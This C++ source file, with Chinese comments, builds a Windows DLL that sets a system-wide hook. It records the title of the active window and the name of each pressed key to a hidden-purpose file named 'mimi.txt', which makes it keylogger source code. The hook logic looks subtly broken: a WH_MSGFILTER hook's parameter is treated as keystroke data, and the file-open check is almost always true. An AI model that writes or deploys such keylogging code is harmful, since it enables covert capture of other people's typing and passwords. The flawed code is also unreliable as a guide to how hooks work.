// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
#include <stdio.h>
#define DEF_PROCESS_NAME "notepad.exe"

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;


BOOL APIENTRY DllMain(HMODULE  hinstDll,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hInstance = hinstDll;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
LRESULT CALLBACK MyMessageProcrss(int Code, WPARAM wParam, LPARAM lParam)
{
	/*MessageBox(NULL, L"有人按键", NULL, 2);

	switch (Code)
	{
	case WM_USER + 1:
	{
		MessageBox(NULL, L"自定义消息启动", NULL, NULL);
	}
	break;
	default:
		break;
	}*/

	//拿到当前窗口的标题
	HWND hWnd = GetActiveWindow();
	if (hWnd == NULL)
	{
		//拿顶层窗口
		hWnd = GetForegroundWindow();
		if (hWnd == NULL)
		{
			//没有窗口 哪就返回了
			return CallNextHookEx(g_hHook, Code, wParam, lParam);
		}
	}

	//在拿标题
	char szWindowTextBuff[256] = { 0 };
	GetWindowTextA(hWnd, szWindowTextBuff, 255);
	//拿到当前按下的键盘上的字符
	if (Code < 0 || Code == HC_NOREMOVE)
	{
		return CallNextHookEx(g_hHook, Code, wParam, lParam);
	}
	/*if (lParam & 0x40000000)
	{
		return CallNextHookEx(g_hHook, Code, wParam, lParam);
	}*/
	//获取按键上的字符
	char keytextbuff[256] = { 0 };
	GetKeyNameTextA(lParam, keytextbuff, 255);

	//保存到文件
	//创建文件或打开文件
	FILE* file;
	errno_t err = fopen_s(&file, "f:\\mimi.txt", "a");
	if (~err)
	{
		////写入数据
		char buff[256] = { 0 };
		sprintf_s(buff, "%s-----%s\n", szWindowTextBuff, keytextbuff);

		////写入文件
		fwrite(buff, 1, strlen(buff), file);
		//关闭文件
		fclose(file);

		return CallNextHookEx(g_hHook, Code, wParam, lParam);
	}
	
	MessageBoxA(NULL, "打开文件失败", NULL, NULL);
	return CallNextHookEx(g_hHook, Code, wParam, lParam);
	

}

#ifdef __cplusplus
extern "C" {
#endif // __cplusplus
    __declspec(dllexport) void HookStart()
    {
        g_hHook = SetWindowsHookEx(WH_MSGFILTER, MyMessageProcrss, GetModuleHandle(L"KeyHook"), 0);
		if (g_hHook == NULL)
		{
			MessageBox(NULL, L"下钩错误", NULL, 2);
			return;
		}
		MessageBox(NULL, L"下钩成功", NULL, 2);
		return ;
    }
    __declspec(dllexport) void HookStop()
    {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    }
#ifdef __cplusplus
}
#endif // __cplusplus
